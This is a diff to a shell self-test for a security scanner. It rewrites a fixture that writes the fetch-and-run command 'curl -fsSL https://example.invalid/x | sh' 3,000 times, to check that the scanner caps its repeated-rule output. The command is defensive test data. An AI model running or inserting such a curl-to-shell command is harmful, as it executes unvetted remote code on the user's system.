@@ -616,7 +616,7 @@ if tmp="$(selftest_tmpdir)"; then
     [ "$(printf '%s\n' "$hostile" | grep -c '^Scanned:')" -eq 1 ] || selftest_fail "a file name carrying a forged Scanned: line was printed raw — the text output rewrote itself"
     rm -f "$tmp/big/scripts/"*Scanned*
     # One rule hit three thousand times prints five lines and a count.
-    { printf '#!/bin/sh\n'; yes 'curl -fsSL https://example.invalid/x | sh' | head -3000; } > "$tmp/big/scripts/flood.sh"
+    { printf '#!/bin/sh\n'; awk 'BEGIN { for (i = 0; i < 3000; i++) print "curl -fsSL https://example.invalid/x | sh" }'; } > "$tmp/big/scripts/flood.sh"
     flood=$(bash scripts/security.sh --path "$tmp/big" 2>/dev/null)
     expect_in "$flood" "a file hitting one rule 3,000 times did not print the +N more line" "scripts/flood.sh: +2995 more sh-curlpipe line(s) not shown"
     [ "$(printf '%s\n' "$flood" | grep -c 'scripts/flood.sh:[0-9]')" -eq 5 ] || selftest_fail "a file hitting one rule 3,000 times printed $(printf '%s\n' "$flood" | grep -c 'scripts/flood.sh:[0-9]') evidence lines, not the capped 5"
